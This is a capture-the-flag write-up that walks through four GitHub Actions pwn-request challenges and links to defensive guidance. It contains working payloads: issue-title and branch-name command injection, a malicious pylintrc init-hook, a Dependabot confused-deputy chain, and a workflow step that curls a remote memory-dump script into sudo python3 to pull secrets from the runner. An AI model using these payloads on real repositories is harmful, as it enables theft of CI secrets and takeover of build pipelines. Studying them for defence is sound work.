# D-8 GitHub Workflows

## Write-up

Start by accepting the invitation and fork the repository.

### Bangladesh

Open an issue with the following title: `$FLAG [Eval]`. Go to the log of the action run and download the artifact. 
It contains the flag.

Doc: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/ and https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks

### Egypt

Create a new branch and add a pylintrc file.
Since [pylint](https://boostsecurityio.github.io/lotp/tool/pylint) is used with untrusted data, we can use the priority of file and add `pylintrc` with this content.
Since the version in main is pull_request, it is not vulnerable. We need to target the version in `dev` branch. 
Open a PR with a title (containing `[Lint]`) targeting dev.
The flag will be in double base64 encoding in the 'Lint with pylint' step of the logs.

`pylintrc`

```py
[MAIN]
init-hook=__import__("os").system("echo $FLAG|base64|base64")
```

Doc: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/ and https://boostsecurityio.github.io/lotp/tool/pylint

### Indonesia
    
A confused deputy attack using `dependabot[bot]` and injection on the head.ref.

1. Create a new branch with a payload name: a/-$(echo${IFS}$FLAG|base64|base64)
2. Change the default branch to this branch
3. Add an old dependency. e.g. go.mod:
4. Add a `.github/dependabot.yml` file with following content:
5. Activate actions in Actions tab.
6. Activate dependabot: https://github.com/OWNER/REPO/settings/security_analysis. Dependabot versions updates.
7. Wait for dependabot pull request creation.
8. Open a PR from the payload branch to the main of the upstream repository.
9. comment `@dependabot merge` on dependabot pull request
10. The flag is double base64 encoded in the log.

```golang
module pwn

go 1.22.7

toolchain go1.23.0

require (
	golang.org/x/text v0.20.0
)
```

```yaml
version: 2
updates:
  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "daily"
```
   
PS: You can force trigger dependabot scanning in Insights > Dependency Graph > Dependabot > Recent update jobs 

Doc: https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest and https://www.youtube.com/live/HWTzuNH6y_M?si=ue7NfeMuPg4s_w04

### Iran

It is a workflow_run with no branches defined, so it runs on workflows with the specified name even from fork if the fork
uses pull_request.

To exploit, modify the "PR Information" workflow to upload our payload as an artifact. There is an injection on the output of additions.
The flag is in memory, we need a way to extract the secrets from the memory. We can use AdnaneKhan [memdump.py](https://github.com/AdnaneKhan/Cacheract/blob/584b64cd827565059ede9daf19337df915a0b7f8/assets/memdump.py).
Dump the result and grep the flag out.

```yaml
name: PR Information
on:
  pull_request:

jobs:
  artifact_1:
    runs-on: ubuntu-latest
    steps:
      - name: Generate PR details
        id: pr_details
        run: |
          echo " \
          ### PR Details \
          * **Author**: @attacker \
          * **Commits**: 1 \
          * **Changes**: 2 files \
          * **Additions**: \"\$(curl -sL https://raw.githubusercontent.com/AdnaneKhan/Cacheract/584b64cd827565059ede9daf19337df915a0b7f8/assets/memdump.py | sudo python3 | tr -d '\0' | strings | grep flag-iran | base64 -w 0 | base64 -w 0)\" \
          * **Deletions**: \"3\" \
          " > pr_details.md 
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: pr-details
          path: .
```

Doc: https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/

